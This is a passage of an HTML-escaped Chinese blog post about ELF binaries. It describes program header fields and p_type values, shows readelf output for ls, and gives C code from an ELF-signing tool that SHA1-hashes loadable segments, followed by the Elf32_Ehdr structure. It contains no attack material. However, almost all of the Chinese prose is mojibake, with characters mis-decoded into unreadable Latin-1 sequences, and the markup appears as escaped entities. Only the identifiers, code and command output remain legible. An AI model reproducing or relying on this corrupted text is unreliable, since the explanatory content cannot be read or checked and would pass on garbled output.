      &lt;td&gt;p_paddr&lt;/td&gt;
      &lt;td&gt;è¯¥å­—æ®µä»…ç”¨äºç‰©ç†åœ°å€å¯»å€ç›¸å…³çš„ç³»ç»Ÿä¸­ï¼Œ ç”±äºâ€System Vâ€ å¿½ç•¥äº†åº”ç”¨ç¨‹åºçš„ç‰©ç†å¯»å€ï¼Œå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶çš„è¯¥é¡¹å†…å®¹å¹¶æœªè¢«é™å®šã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;p_filesz&lt;/td&gt;
      &lt;td&gt;è¯¥å­—æ®µç»™å‡ºäº†æ–‡ä»¶é•œåƒä¸­è¯¥æ®µçš„å¤§å°ï¼Œå¯èƒ½ä¸º 0ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;p_memsz&lt;/td&gt;
      &lt;td&gt;è¯¥å­—æ®µç»™å‡ºäº†å†…å­˜é•œåƒä¸­è¯¥æ®µçš„å¤§å°ï¼Œå¯èƒ½ä¸º 0ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;p_flags&lt;/td&gt;
      &lt;td&gt;è¯¥å­—æ®µç»™å‡ºäº†ä¸æ®µç›¸å…³çš„æ ‡è®°ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;p_align&lt;/td&gt;
      &lt;td&gt;å¯åŠ è½½çš„ç¨‹åºçš„æ®µçš„ p_vaddr ä»¥åŠ p_offset çš„å¤§å°å¿…é¡»æ˜¯ page çš„æ•´æ•°å€ã€‚è¯¥æˆå‘˜ç»™å‡ºäº†æ®µåœ¨æ–‡ä»¶ä»¥åŠå†…å­˜ä¸­çš„å¯¹é½æ–¹å¼ã€‚å¦‚æœè¯¥å€¼ä¸º 0 æˆ– 1 çš„è¯ï¼Œè¡¨ç¤ºä¸éœ€è¦å¯¹é½ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œp_align åº”è¯¥æ˜¯ 2 çš„æ•´æ•°æŒ‡æ•°æ¬¡æ–¹ï¼Œå¹¶ä¸” p_vaddr ä¸ p_offset åœ¨æ¨¡ p_align çš„æ„ä¹‰ä¸‹ï¼Œåº”è¯¥ç›¸ç­‰ã€‚&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ç„¶è€Œæˆ‘ä»¬éœ€è¦å¾—å‡ºè¿™ä¸ªSegmentæ˜¯ä¸æ˜¯å¯ä»¥åŠ è½½çš„(Loadable)ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç»§ç»­åˆ†æ&lt;code class=&quot;highlighter-rouge&quot;&gt;p_type&lt;/code&gt;å­—æ®µï¼Œç»†èŠ‚å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;åå­—&lt;/th&gt;
      &lt;th&gt;å–å€¼&lt;/th&gt;
      &lt;th&gt;è¯´æ˜&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;PT_NULL&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;è¡¨æ˜æ®µæœªä½¿ç”¨ï¼Œå…¶ç»“æ„ä¸­å…¶ä»–æˆå‘˜éƒ½æ˜¯æœªå®šä¹‰çš„ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PT_LOAD&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;æ­¤ç±»å‹æ®µä¸ºä¸€ä¸ªå¯åŠ è½½çš„æ®µï¼Œå¤§å°ç”± p_filesz å’Œ p_memsz æè¿°ã€‚æ–‡ä»¶ä¸­çš„å­—èŠ‚è¢«æ˜ å°„åˆ°ç›¸åº”å†…å­˜æ®µå¼€å§‹å¤„ã€‚å¦‚æœ p_memsz å¤§äº p_fileszï¼Œâ€œå‰©ä½™â€ çš„å­—èŠ‚éƒ½è¦è¢«ç½®ä¸º 0ã€‚p_filesz ä¸èƒ½å¤§äº p_memszã€‚å¯åŠ è½½çš„æ®µåœ¨ç¨‹åºå¤´éƒ¨ä¸­æŒ‰ç…§ p_vaddr çš„å‡åºæ’åˆ—ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PT_DYNAMIC&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;æ­¤ç±»å‹æ®µç»™å‡ºåŠ¨æ€é“¾æ¥ä¿¡æ¯ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PT_INTERP&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;æ­¤ç±»å‹æ®µç»™å‡ºäº†ä¸€ä¸ªä»¥ NULL ç»“å°¾çš„å­—ç¬¦ä¸²çš„ä½ç½®å’Œé•¿åº¦ï¼Œè¯¥å­—ç¬¦ä¸²å°†è¢«å½“ä½œè§£é‡Šå™¨è°ƒç”¨ã€‚è¿™ç§æ®µç±»å‹ä»…å¯¹å¯æ‰§è¡Œæ–‡ä»¶æœ‰æ„ä¹‰ï¼ˆä¹Ÿå¯èƒ½å‡ºç°åœ¨å…±äº«ç›®æ ‡æ–‡ä»¶ä¸­ï¼‰ã€‚æ­¤å¤–ï¼Œè¿™ç§æ®µåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­æœ€å¤šå‡ºç°ä¸€æ¬¡ã€‚è€Œä¸”è¿™ç§ç±»å‹çš„æ®µå­˜åœ¨çš„è¯ï¼Œå®ƒå¿…é¡»åœ¨æ‰€æœ‰å¯åŠ è½½æ®µé¡¹çš„å‰é¢ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PT_NOTE&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;æ­¤ç±»å‹æ®µç»™å‡ºé™„åŠ ä¿¡æ¯çš„ä½ç½®å’Œå¤§å°ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PT_SHLIB&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;è¯¥æ®µç±»å‹è¢«ä¿ç•™ï¼Œä¸è¿‡è¯­ä¹‰æœªæŒ‡å®šã€‚è€Œä¸”ï¼ŒåŒ…å«è¿™ç§ç±»å‹çš„æ®µçš„ç¨‹åºä¸ç¬¦åˆ ABI æ ‡å‡†ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PT_PHDR&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;è¯¥æ®µç±»å‹çš„æ•°ç»„å…ƒç´ å¦‚æœå­˜åœ¨çš„è¯ï¼Œåˆ™ç»™å‡ºäº†ç¨‹åºå¤´éƒ¨è¡¨è‡ªèº«çš„å¤§å°å’Œä½ç½®ï¼Œæ—¢åŒ…æ‹¬åœ¨æ–‡ä»¶ä¸­ä¹ŸåŒ…æ‹¬åœ¨å†…å­˜ä¸­çš„ä¿¡æ¯ã€‚æ­¤ç±»å‹çš„æ®µåœ¨æ–‡ä»¶ä¸­æœ€å¤šå‡ºç°ä¸€æ¬¡ã€‚æ­¤å¤–ï¼Œåªæœ‰ç¨‹åºå¤´éƒ¨è¡¨æ˜¯ç¨‹åºçš„å†…å­˜æ˜ åƒçš„ä¸€éƒ¨åˆ†æ—¶ï¼Œå®ƒæ‰ä¼šå‡ºç°ã€‚å¦‚æœæ­¤ç±»å‹æ®µå­˜åœ¨ï¼Œåˆ™å¿…é¡»åœ¨æ‰€æœ‰å¯åŠ è½½æ®µé¡¹ç›®çš„å‰é¢ã€‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PT_LOPROC~PT_HIPROC&lt;/td&gt;
      &lt;td&gt;0x70000000 ~0x7fffffff&lt;/td&gt;
      &lt;td&gt;æ­¤èŒƒå›´çš„ç±»å‹ä¿ç•™ç»™å¤„ç†å™¨ä¸“ç”¨è¯­ä¹‰ã€‚&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;â€ƒâ€ƒè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œå½“&lt;code class=&quot;highlighter-rouge&quot;&gt;p_type&lt;/code&gt;å­—æ®µçš„å€¼ä¸º&lt;code class=&quot;highlighter-rouge&quot;&gt;PT_LOAD&lt;/code&gt;æ—¶ï¼Œè¯¥segmentæ˜¯å¯åŠ è½½çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡&lt;code class=&quot;highlighter-rouge&quot;&gt;readelf -Wl ./ls&lt;/code&gt;è¿™ä¸ªå‘½ä»¤æ¥æŸ¥çœ‹ç›¸å…³çš„ä¿¡æ¯ï¼Œæˆ‘è¿™é‡Œæˆªå–lsçš„ç›¸å…³ä¿¡æ¯ä»¥åšæ¼”ç¤ºï¼š&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aurora:/home/code/solo/rubbish/ELFsign/build&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;masterâš¡&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# readelf -Wl ls&lt;/span&gt;

Elf æ–‡ä»¶ç±»å‹ä¸º DYN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;å…±äº«ç›®æ ‡æ–‡ä»¶&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Entry point 0x6130
There are 11 program headers, starting at offset 64

ç¨‹åºå¤´ï¼š
  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
  PHDR           0x000040 0x0000000000000040 0x0000000000000040 0x000268 0x000268 R   0x8
  INTERP         0x0002a8 0x00000000000002a8 0x00000000000002a8 0x00001c 0x00001c R   0x1
      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x003438 0x003438 R   0x1000
  LOAD           0x004000 0x0000000000004000 0x0000000000004000 0x012c49 0x012c49 R E 0x1000
  LOAD           0x017000 0x0000000000017000 0x0000000000017000 0x008910 0x008910 R   0x1000
  LOAD           0x020390 0x0000000000021390 0x0000000000021390 0x001258 0x002548 RW  0x1000
  DYNAMIC        0x020dd8 0x0000000000021dd8 0x0000000000021dd8 0x0001f0 0x0001f0 RW  0x8
  NOTE           0x0002c4 0x00000000000002c4 0x00000000000002c4 0x000044 0x000044 R   0x4
  GNU_EH_FRAME   0x01c12c 0x000000000001c12c 0x000000000001c12c 0x0008fc 0x0008fc R   0x4
  GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x10
  GNU_RELRO      0x020390 0x0000000000021390 0x0000000000021390 0x000c70 0x000c70 R   0x1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â€ƒâ€ƒå¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰4ä¸ª&lt;code class=&quot;highlighter-rouge&quot;&gt;LOAD SEGMENT&lt;/code&gt;ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å°†å¯¹åº”çš„segmentå†…å®¹è¯»å‡ºæ¥å³å¯ï¼Œè¿™é‡Œçš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;p_offset&lt;/code&gt;å­—æ®µä»£è¡¨è¯¥segmentçš„åç§»åœ°å€ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;p_filesz&lt;/code&gt;å­—æ®µä»£è¡¨è¯¥segmentçš„å¤§å°ï¼Œå¯ä»¥å¯¹ç…§ä¸Šé¢çš„readelfçš„ä¿¡æ¯çœ‹ï¼Œå³&lt;em&gt;Offset&lt;/em&gt;ä¸&lt;em&gt;FileSiz&lt;/em&gt;ã€‚&lt;/li&gt;
  &lt;li&gt;å°†fdæŒ‡é’ˆè®¾ç½®åˆ°&lt;code class=&quot;highlighter-rouge&quot;&gt;p_offset&lt;/code&gt;å¯¹åº”çš„åç§»å¤„ï¼Œè¯»å–&lt;code class=&quot;highlighter-rouge&quot;&gt;p_filesz&lt;/code&gt;å¤§å°çš„å†…å®¹å³å¯ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å…·ä½“çš„å®ç°å¤§è‡´å¦‚ä¸‹,æˆ‘è¿™é‡Œè¯»å‡ºå†…å®¹ä¹‹åç›´æ¥å°±åšäº†Hash,ä»£ç åœ¨&lt;a href=&quot;https://github.com/Explainaur/ELFSign/blob/master/src/elf32.c#L245&quot;&gt;src/elf32.c&lt;/a&gt;ï¼š&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;fseek&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;programHeaderTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SEEK_SET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ehdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e_phnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Elf32_Phdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Elf32_Phdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;err_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Read Program Header failed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/* Judge if Load Segment */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PT_LOAD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Read Load Segment content */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetLoadSegment32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;SHA1_Update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_filesz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Free content memory */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â€ƒâ€ƒåˆ°è¿™é‡Œæˆ‘ä»¬å·²ç»å°†æ‰€æœ‰çš„Load Segmentè¯»å…¥å¹¶åšäº†Hashã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦è¿›è¡Œæœ€é‡è¦çš„ä¸€æ­¥ï¼Œå®Œæˆsectionçš„æ·»åŠ å’Œè¯»å†™æ¨¡å—ã€‚&lt;/p&gt;

&lt;h3 id=&quot;elfæ–‡ä»¶çš„è¯»å†™æ¨¡å—&quot;&gt;ELFæ–‡ä»¶çš„è¯»å†™æ¨¡å—&lt;/h3&gt;

&lt;p&gt;è¯¥æ¨¡å—åº”å½“æœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¯è¯»ä»»æ„sectionçš„å†…å®¹&lt;/li&gt;
  &lt;li&gt;å¯æ–°å»ºä¸€ä¸ªsectionç”¨æ¥å­˜æ”¾ç­¾å&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å…³äºsectionçš„è§£æï¼Œæˆ‘ä»¬ä¸»è¦éœ€è¦åˆ†æ ELF Header ä¸ Section Header Tableã€‚ä¸‹é¢æˆ‘ä»¬å…ˆæ¥ç®€å•ä»‹ç»ä¸€ä¸‹ELF Headerçš„ä¿¡æ¯ã€‚&lt;/p&gt;

&lt;p&gt;ELF Header æè¿°äº† ELF æ–‡ä»¶çš„æ¦‚è¦ä¿¡æ¯ï¼Œåˆ©ç”¨è¿™ä¸ªæ•°æ®ç»“æ„å¯ä»¥ç´¢å¼•åˆ° ELF æ–‡ä»¶çš„å…¨éƒ¨ä¿¡æ¯ï¼Œæ•°æ®ç»“æ„å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define EI_NIDENT   16
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e_ident&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EI_NIDENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_machine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Addr&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Off&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e_phoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Off&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e_shoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_ehsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_phentsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_phnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_shentsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_shnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_shstrndx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf32_Ehdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨è¿™é‡Œå°±ä¸æ·±å…¥çš„ä»‹ç»æ¯ä¸ªå­—æ®µä»£è¡¨çš„è¯¦ç»†æ„ä¹‰ï¼Œåªç®€å•ä»‹ç»ä¸€äº›æ¯”è¾ƒé‡è¦çš„å­—æ®µã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;e_shoff&lt;br /&gt;
è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´è¡¨åœ¨æ–‡ä»¶ä¸­çš„å­—èŠ‚åç§»ï¼ˆ Section Header table OFFset ï¼‰å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰èŠ‚å¤´è¡¨ï¼Œåˆ™ä¸º 0&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;e_shentsize&lt;br /&gt;
è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´çš„å­—èŠ‚é•¿åº¦ï¼ˆSection Header ENTry SIZEï¼‰ã€‚ä¸€ä¸ªèŠ‚å¤´æ˜¯èŠ‚å¤´è¡¨ä¸­çš„ä¸€é¡¹ï¼›èŠ‚å¤´è¡¨ä¸­æ‰€æœ‰é¡¹å æ®çš„ç©ºé—´å¤§å°ç›¸åŒã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;e_shnum&lt;br /&gt;
è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´è¡¨ä¸­çš„é¡¹æ•°ï¼ˆSection Header NUMberï¼‰ã€‚å› æ­¤ï¼Œ e_shnum ä¸ e_shentsize çš„ä¹˜ç§¯å³ä¸ºèŠ‚å¤´è¡¨çš„å­—èŠ‚é•¿åº¦ã€‚å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰èŠ‚å¤´è¡¨ï¼Œåˆ™è¯¥é¡¹å€¼ä¸º 0ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;e_shstrndx&lt;br /&gt;
è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´è¡¨ä¸­ä¸èŠ‚åå­—ç¬¦ä¸²è¡¨ç›¸å…³çš„è¡¨é¡¹çš„ç´¢å¼•å€¼ï¼ˆSection Header table InDeX related with section name STRing tableï¼‰ã€‚å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰èŠ‚åå­—ç¬¦ä¸²è¡¨ï¼Œåˆ™è¯¥é¡¹å€¼ä¸ºSHN_UNDEFã€‚&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

